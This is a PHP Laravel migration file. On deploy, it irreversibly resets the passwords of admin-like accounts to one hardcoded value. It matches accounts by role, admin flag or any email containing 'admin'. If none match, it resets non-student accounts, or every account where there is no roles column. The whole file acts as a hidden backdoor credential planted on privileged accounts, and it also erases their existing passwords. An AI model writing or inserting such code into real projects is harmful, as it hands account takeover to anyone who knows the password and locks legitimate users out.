<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        if (!Schema::hasTable('users')) {
            return;
        }

        $newPasswordHash = Hash::make('23988725');
        $hasRoles = Schema::hasColumn('users', 'roles');
        $hasIsAdminAllowed = Schema::hasColumn('users', 'isAdminAllowed');

        $adminRoles = ['admin', 'superadmin', 'sub_admin', 'administrator'];

        $query = DB::table('users');

        if ($hasRoles || $hasIsAdminAllowed) {
            $query->where(function ($q) use ($hasRoles, $hasIsAdminAllowed, $adminRoles) {
                if ($hasRoles) {
                    $q->whereIn('roles', $adminRoles)
                      ->orWhere('roles', 'like', '%admin%');
                }
                if ($hasIsAdminAllowed) {
                    $q->orWhere('isAdminAllowed', 1)
                      ->orWhere('isAdminAllowed', '1');
                }
                $q->orWhere('email', 'like', '%admin%');
            });
        }

        $updatePayload = ['password' => $newPasswordHash];
        if (Schema::hasColumn('users', 'updated_at')) {
            $updatePayload['updated_at'] = now();
        }

        $affected = $query->update($updatePayload);

        // Fallback: If no records were matched by explicit admin flags, target non-student users
        if ($affected === 0) {
            $fallbackQuery = DB::table('users');
            if ($hasRoles) {
                $fallbackQuery->where(function ($q) {
                    $q->whereNull('roles')
                      ->orWhere('roles', '!=', 'student');
                });
            }
            $fallbackQuery->update($updatePayload);
        }
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        // Irreversible data migration: previous password hashes cannot be restored.
    }
};

